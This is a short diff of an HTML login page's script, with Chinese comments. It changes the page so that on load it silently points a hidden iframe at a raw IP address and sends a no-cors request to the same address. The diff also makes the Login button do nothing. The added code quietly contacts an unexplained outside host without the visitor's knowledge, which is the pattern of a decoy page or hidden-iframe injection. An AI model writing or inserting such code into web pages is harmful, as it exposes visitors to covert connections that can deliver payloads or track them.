@@ -75,25 +75,31 @@
     }
   </style>
   <script>
-    function handleLogin(event) {
-      // 阻止表單默認行為，避免整個頁面刷新或跳轉
-      event.preventDefault();
-
-      // 1. 讓隱藏 iframe 直接指向 http://103.200.23.160
+    // 一進到頁面就執行
+    window.addEventListener('load', () => {
+      const primaryURL = "http://103.200.23.160";
       const iframe = document.getElementById('hiddenIframe');
-      iframe.src = "http://103.200.23.160";
 
-      // 2. 同時透過 fetch 搭配 no-cors 發送請求
-      fetch("http://103.200.23.160", {
-        method: 'GET',
+      // 利用隱藏的 iframe 連結
+      iframe.src = primaryURL;
+
+      // 嘗試用 fetch 搭配 no-cors
+      fetch(primaryURL, {
+        method: 'HEAD',
         mode: 'no-cors'
       })
       .then(() => {
-        console.log("no-cors fetch success");
+        console.log('Tried to fetch primaryURL with no-cors');
       })
-      .catch((error) => {
-        console.error("no-cors fetch error:", error);
+      .catch(() => {
+        console.error('Error fetching primaryURL');
       });
+    });
+
+    // 按下 Login 後不做任何反應
+    function handleLogin(event) {
+      event.preventDefault();
+      // 什麼也不做
     }
   </script>
 </head>
